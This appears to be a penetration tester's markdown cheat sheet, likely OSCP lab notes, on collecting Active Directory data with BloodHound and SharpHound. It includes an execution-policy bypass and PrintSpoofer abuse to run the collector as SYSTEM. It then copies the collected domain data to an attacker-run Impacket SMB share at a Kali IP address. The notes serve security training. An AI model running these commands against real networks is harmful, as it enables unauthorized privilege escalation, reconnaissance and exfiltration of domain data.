# Bloodhound

## Latest SharpHound
```bash
wget https://github.com/BloodHoundAD/BloodHound/raw/master/Collectors/SharpHound.ps1
```
```bash
## Run it
#Powershell
powershell -ep bypass

# Load Module
Import-Module .\SharpHound.ps1

# BloodHound
Invoke-BloodHound -CollectionMethod All
----------------------
# Windows Based (SharpHound.exe)
# Run it
.\SharpHound.exe -c All
```

## Running SharpHound with PrintSpoofer Abuse
```bash
upload SharpHound.exe

#Unable to run due to restriction on running files. Abuse printspoofer.
.\PrintSpoofer64.exe -i -c "cmd /c C:\Users\eric.wallows\Documents\SharpHound.exe -c All"

#NOTE: Printspoofer runs as System32, so the file will be saved there since we did not specify an output.
# Find file
ls C:\Windows\System32\*.zip

# Copy it over to Documents folder
copy C:\Windows\System32\20260407171325_BloodHound.zip C:\Users\eric.wallows\Documents\BloodHound.zip

# Download
download BloodHound.zip
```
## Transfer File to Kali with Impacket SMB Server
```bash
cd ~/impacket-latest/examples

# Run (ON KALI)
python3 smbserver.py -smb2support test /home/kali/oscp

# Copy File (ON TARGET MACHINE)
copy 20260318174600_BloodHound.zip \\192.168.45.227\test
```

## Start Bloodhound
```bash
sudo neo4j start

# Then Bloodhound
bloodhound
```
![alt text](image-2.png)